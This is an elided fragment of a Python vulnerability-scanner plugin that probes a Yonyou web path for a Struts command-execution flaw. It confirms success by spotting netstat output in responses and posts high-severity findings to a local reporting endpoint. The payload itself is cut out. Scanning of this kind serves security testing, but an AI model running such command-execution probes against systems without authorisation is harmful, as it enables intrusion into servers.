        ...
        for turl in [r"/web/icc/chat/chat?c=1&s=1",
            ...
            try:
                ...
                if r"Active Internet connections" in req.text:
                    ...
                    postdata = {self.url:"存在用友struts 命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Linux]"}
                ...
                if r"Active Connections" in req.text or r"活动连接" in req.text:
                    ...
                    postdata = {self.url:"存在用友struts 命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Windows]"}
                    requests.post('http://localhost:8848/cms', json=postdata)
                if r"LISTEN" in req.text:
                    cprint("[+]可能存在用友struts 命令执行漏洞...(高危)\tpayload: "+vulnurl, "red")
                    postdata = {self.url:"可能存在用友struts 命令执行漏洞...(高危)\tpayload: "+vulnurl}
                    requests.post('http://localhost:8848/cms', json=postdata)
                else:
